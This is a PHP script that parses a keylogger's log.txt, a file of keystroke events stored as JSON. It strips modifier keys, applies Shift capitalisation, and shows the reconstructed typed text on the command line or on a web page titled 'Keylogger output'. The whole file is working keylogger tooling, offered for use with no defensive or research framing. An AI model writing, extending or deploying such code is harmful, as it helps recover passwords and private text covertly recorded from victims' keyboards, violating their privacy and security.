<?php
$filename = __DIR__ . '/log.txt';
if (!is_readable($filename)) {
    die("Can't load file: $filename");
}

$output = '';
$lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

foreach ($lines as $line) {
    if (!preg_match('/\]\s*(\[.*\])\s*$/u', $line, $m)) {
        continue;
    }

    $json = $m[1];
    $events = json_decode($json, true);
    if (!is_array($events)) continue;

    // Check if Shift wasn't pressed
    $hasShift = false;
    foreach ($events as $ev) {
        if (isset($ev['k']) && mb_strtolower($ev['k']) === 'shift') {
            $hasShift = true;
            break;
        }
    }

    foreach ($events as $ev) {
        if (!isset($ev['k'])) continue;
        $k = $ev['k'];

        // Ignore all other "special" keyboard buttons
        $lower = mb_strtolower($k);
        if (in_array($lower, ['shift', 'alt', 'ctrl', 'control', 'meta', 'windows', 'cmd'])) {
            continue;
        }

        // Check if Shift was pressed
        if ($hasShift && mb_strlen($k) === 1 && preg_match('/\p{L}/u', $k)) {
            $k = mb_strtoupper($k);
        }

        // Append til output
        $output .= $k;
    }
}

if (php_sapi_name() === 'cli') {
    echo $output . PHP_EOL;
} else {
    echo '<!doctype html><meta charset="utf-8"><title>Keylogger output</title>';
    echo '<h3>Content from log.txt</h3>';
    echo '<pre style="white-space:pre-wrap;">' . htmlspecialchars($output, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8') . '</pre>';
}
